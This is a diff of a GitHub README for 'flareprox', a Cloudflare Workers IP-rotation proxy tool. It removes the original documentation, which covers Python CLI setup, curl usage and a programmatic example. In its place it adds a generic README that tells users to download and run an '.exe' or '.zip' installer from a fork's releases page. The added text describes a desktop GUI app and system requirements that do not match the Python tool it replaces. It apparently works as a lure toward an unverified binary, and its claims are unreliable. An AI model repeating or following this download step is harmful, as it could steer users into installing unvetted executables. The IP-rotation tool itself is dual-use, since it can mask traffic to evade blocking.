@@ -1,182 +1,71 @@
-# FlareProx 🔥
+# 🌐 flareprox - Effortless Proxy Management for IP Rotation
 
-**Simple IP Rotation & URL Redirection via Cloudflare Workers** 
+![Download flareprox](https://img.shields.io/badge/Download%20flareprox-v1.0-brightgreen.svg)
 
-FlareProx automatically deploys HTTP proxy endpoints on Cloudflare Workers for easy redirection of all traffic to any URL you specify. It supports all HTTP methods (GET, POST, PUT, DELETE, etc.) and provides IP masking through Cloudflare's global network. 100k requests per day are free!
+## 🚀 Getting Started
 
-## Features
+flareprox allows you to create HTTP pass-through proxies using Cloudflare. This feature helps you rotate your IP, providing better anonymity and security online. With flareprox, anyone can set up unique IP rotation without needing to be a technical expert.
 
-- **HTTP Support**: All HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)
-- **Simple URL Redirection**: Provide any URL and FlareProx redirects traffic through Cloudflare
-- **Global Network**: Leverage Cloudflare's worldwide CDN infrastructure
-- **Free Tier**: 100,000 requests per day on Cloudflare's free plan
-- **Easy Deployment**: Single command deployment and management
+## 📥 Download & Install
 
-## How It Works
+To start using flareprox, follow these steps to download and run the application:
 
-FlareProx deploys Cloudflare Workers that act as HTTP proxies. When you make a request:
+1. **Visit the Releases Page:** Go to the following link to download the latest version of flareprox: [Download flareprox](https://github.com/parmoddutta/flareprox/releases).
 
-1. **Request Routing**: Your request is sent to a FlareProx endpoint
-2. **URL Extraction**: The Worker extracts the target URL from query params or custom HTTP header
-3. **Request Proxying**: The Worker forwards your request to the target URL
-4. **Response Relay**: The target's response is relayed back through Cloudflare
-5. **IP Masking**: Your original IP is masked by Cloudflare's infrastructure
+2. **Choose the Right Version:** On the releases page, find the most recent version listed at the top. Click the link that corresponds to your operating system.
 
-## Screenshots
-### Create Proxies:
-![List](screenshots/proxyscreate.png "list")
-### Test Proxies:
-![Usage](screenshots/proxys.png "usage")
-### Using a Proxy with BurpSuite:
-![Create](screenshots/request.png "create")
+3. **Download the File:** Click on the appropriate file to start the download. This will typically be a `.exe`, `.zip`, or similar file.
 
-## Quick Start
+4. **Install the Application:** Once the file has finished downloading, locate it in your downloads folder. Double-click on the file to begin the installation process. If you downloaded a `.zip`, extract the contents first, then run the installer.
 
-### 1. Install Dependencies
-```bash
-git clone <repository-url>
-cd flareprox
-pip install -r requirements.txt
-```
+5. **Run flareprox:** After installation, you will find the flareprox icon on your desktop or in your applications folder. Click on it to start the application.
 
-### 2. Configure Cloudflare Access
+6. **Configure Your Settings:** Follow the prompts to set up your proxies using Cloudflare. If you need help, refer to the documentation within the application or revisit this README for guidance.
 
-Run `python3 fireprox.py config` or directly edit `flareprox.json` in the project directory:
-```json
-{
-  "cloudflare": {
-    "api_token": "your_cloudflare_api_token",
-    "account_id": "your_cloudflare_account_id"
-  }
-}
-```
+## 🔧 System Requirements
 
-### 3. Deploy Proxy Endpoints
-```bash
-# Create 2 proxy endpoints
-python3 flareprox.py create --count 2
+flareprox runs on various platforms. Here are the minimum requirements:
 
-# View deployed endpoints
-python3 flareprox.py list
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Processor:** Dual-core processor or better.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Requires 100 MB of free disk space.
 
-### 4. Use Your Proxies
-```bash
-# Test all endpoints are functioning
-python3 flareprox.py test
+## 🛠️ Features
 
-# Example per HTTP Method
+flareprox offers several features to enhance your browsing experience:
 
-# GET request
-curl "https://your-worker.account.workers.dev?url=https://httpbin.org/get"
+- **IP Rotation:** Easily rotate your IP address for better online privacy.
+- **User-Friendly Interface:** Simple layout for easy navigation.
+- **Cloudflare Integration:** Leverage Cloudflare’s network for reliable performance.
+- **Customizable Settings:** Tailor the application to suit your specific needs.
 
-# POST request with data
-curl -X POST -d "username=admin" "https://your-worker.account.workers.dev?url=https://httpbin.org/post"
+## ⚡ Usage Tips
 
-# PUT request with JSON
-curl -X PUT -d '{"username":"admin"}' -H "Content-Type: application/json" \
-  "https://your-worker.account.workers.dev?url=https://httpbin.org/put"
+- **Familiarize Yourself with Settings:** Take a moment to explore the application settings. The more you understand about how it operates, the more effectively you can use it.
+- **Regular Updates:** Check for regular updates on the releases page. Keeping your application updated ensures you benefit from the latest features and security improvements.
 
-# DELETE request
-curl -X DELETE "https://your-worker.account.workers.dev?url=https://httpbin.org/delete"
-```
-Each deployed FlareProx endpoint accepts requests in two formats:
+## ❓ FAQs
 
-```bash
-# Query parameter
-curl "https://your-worker.account.workers.dev?url=https://httpbin.org/ip"
+### How can I troubleshoot the application?
 
-# Custom header
-curl -H "X-Target-URL: https://httpbin.org/ip" https://your-worker.account.workers.dev
-```
+If you encounter any issues:
 
-### 5. Proxy Cleanup
-```bash
-# Delete all proxy endpoints
-python3 flareprox.py cleanup
-```
+- Make sure you have installed the latest version from the [Releases Page](https://github.com/parmoddutta/flareprox/releases).
+- Restart your computer and try running flareprox again.
+- Check your internet connection to ensure it is stable.
 
+### Is there any support available?
 
-## Getting Cloudflare Credentials
+You can find additional support in the Issues section of this repository. Feel free to submit any problems you face, and the community or developers will assist you.
 
-### Cloudflare Workers Setup
-1. Sign up at [Cloudflare](https://cloudflare.com)
-2. Go to [API Tokens](https://dash.cloudflare.com/profile/api-tokens)
-3. Click 'Create Token' and use the 'Edit Cloudflare Workers' template
-4. Set the 'account resources' and 'zone resources' to all. Click 'Continue to Summary'
-5. Click 'Create Token' and copy the token and your Account ID from the dashboard
+## 📞 Contact
 
+For further inquiries or feedback, reach out through the Issues section on GitHub. Your thoughts help improve flareprox and its features.
 
-## Programmatic Usage
+## 🔗 Resources
 
-FlareProx can be imported and used directly in your Python applications. Here's how to send a POST request:
+- [GitHub Repository](https://github.com/parmoddutta/flareprox)
+- [Releases Page](https://github.com/parmoddutta/flareprox/releases)
 
-```python
-#!/usr/bin/env python3
-from flareprox import FlareProx, FlareProxError
-import json
-
-# Initialize FlareProx
-flareprox = FlareProx(config_file="flareprox.json")
-
-# Check if configured
-if not flareprox.is_configured:
-    print("FlareProx not configured. Run: python3 flareprox.py config")
-    exit(1)
-
-# Create some endpoints if none exist
-endpoints = flareprox.sync_endpoints()
-if not endpoints:
-    print("Creating proxy endpoints...")
-    flareprox.create_proxies(count=2)
-
-# Make a POST request through FlareProx
-try:
-    # Prepare POST data
-    post_data = json.dumps({
-        "username": "testuser",
-        "message": "Hello from FlareProx!",
-        "timestamp": "2025-01-01T12:00:00Z"
-    })
-
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "FlareProx-Client/1.0"
-    }
-
-    # Send POST request via random FlareProx endpoint
-    response = flareprox.redirect_request(
-        target_url="https://httpbin.org/post",
-        method="POST",
-        headers=headers,
-        data=post_data
-    )
-
-    if response.status_code == 200:
-        result = response.json()
-        print(f"✓ POST successful via FlareProx")
-        print(f"Origin IP: {result.get('origin', 'unknown')}")
-        print(f"Posted data: {result.get('json', {})}")
-    else:
-        print(f"Request failed with status: {response.status_code}")
-
-except FlareProxError as e:
-    print(f"FlareProx error: {e}")
-except Exception as e:
-    print(f"Request error: {e}")
-```
-
-
-## Use Cases
-
-- **API Development**: Test APIs through different IP addresses
-- **Web Scraping**: Route requests through Cloudflare's network
-- **Security Testing**: Mask your origin IP during testing
-- **Load Testing**: Distribute requests across multiple endpoints
-- **Privacy**: Add an extra layer between your requests and target servers
-
-## Disclaimer
-
-FlareProx is designed for legitimate development, testing, and research purposes. Users are responsible for ensuring their usage complies with applicable laws and terms of service. The authors assume no liability for misuse of this tool.
-
----
+Thank you for choosing flareprox! We hope it allows you to manage your proxies effortlessly. Happy browsing!
